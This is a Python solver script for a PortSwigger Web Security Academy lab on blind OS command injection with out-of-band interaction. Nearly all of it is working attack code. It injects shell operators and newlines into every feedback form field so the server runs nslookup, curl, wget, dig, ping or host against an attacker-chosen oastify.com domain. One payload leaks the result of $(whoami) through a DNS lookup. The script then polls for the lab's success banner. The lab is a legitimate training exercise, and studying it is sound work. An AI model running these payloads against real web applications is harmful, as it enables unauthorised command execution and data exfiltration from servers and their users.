#!/usr/bin/env python3
"""
Blind OS command injection with out-of-band interaction
PortSwigger Web Security Academy -- OS Command Injection

Companion script for the writeup: 04-blind-out-of-band-interaction.md

What this does:
    PortSwigger's intended path for this lab is Burp Suite Professional's
    Collaborator client -- a paid-tier feature we didn't use. Instead, this
    script generates its own random hex token and builds a *.oastify.com
    subdomain directly: PortSwigger's Academy lab environments only permit
    outbound traffic to that wildcard domain (it's what their own Collaborator
    infrastructure listens on), and the lab's win condition is just "the
    backend made an outbound DNS/HTTP request to *.oastify.com" -- it never
    checks that the request arrived at a Collaborator client we control. So no
    Collaborator polling is needed at all; we only need to cause the hit.

    It fires the full operator (||, &, ;) x tool (nslookup, curl, wget, dig,
    ping, host) sweep across all four form fields, plus two extra verified
    variants (a $(whoami)-in-subdomain payload and a %0a newline-separator
    payload), then polls the lab's own root page on a backoff for the
    "Congratulations" banner the platform flips once it sees the interaction.

Usage:
    python 04-blind-out-of-band-interaction.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import secrets
import sys
import time
import httpx

OPERATORS = ["||", "&", ";"]
PARAMS = ["email", "name", "subject", "message"]


def get_csrf(client: httpx.Client, feedback_url: str) -> str:
    r = client.get(feedback_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        m = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    feedback_url = f"{lab_url}/feedback"
    submit_url = f"{lab_url}/feedback/submit"

    token = secrets.token_hex(16)
    oast_domain = f"{token}.oastify.com"
    print(f"[*] OAST domain: {oast_domain}")

    csrf = get_csrf(client, feedback_url)
    base_data = {
        "csrf": csrf, "name": "test", "email": "test@test.com",
        "subject": "test", "message": "test",
    }

    tools = [
        f"nslookup {oast_domain}",
        f"curl http://{oast_domain}",
        f"wget http://{oast_domain}",
        f"dig {oast_domain}",
        f"ping -c 1 {oast_domain}",
        f"host {oast_domain}",
    ]

    total = 0
    for param in PARAMS:
        for op in OPERATORS:
            for tool_cmd in tools:
                prefix = base_data.get(param, "x")
                payload = f"{prefix}{op}{tool_cmd}{op}"
                data = {**base_data, param: payload}
                try:
                    client.post(submit_url, data=data)
                    total += 1
                except Exception:
                    pass

        # Two extra verified variants outside the operator x tool grid:
        # a $(whoami) subshell embedded in the DNS label, and a bare
        # newline separator instead of a shell operator.
        subshell_payload = f"x||nslookup $(whoami).{oast_domain}||"
        newline_payload = f"x\nnslookup {oast_domain}\n"
        for extra in (subshell_payload, newline_payload):
            data = {**base_data, param: extra}
            try:
                client.post(submit_url, data=data)
                total += 1
            except Exception:
                pass

    print(f"[*] Sent {total} OOB payloads across email/name/subject/message to {oast_domain}")
    print("[*] Waiting for the lab platform to auto-detect the interaction...")

    for wait in (10, 10, 20, 20):
        time.sleep(wait)
        r = client.get(lab_url)
        if "congratulations" in r.text.lower():
            print("[+] Lab solved -- out-of-band interaction confirmed.")
            return
        print(f"    still waiting ({wait}s)...")

    print("[-] Not solved after 60s. Try re-running -- OAST callbacks can be delayed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
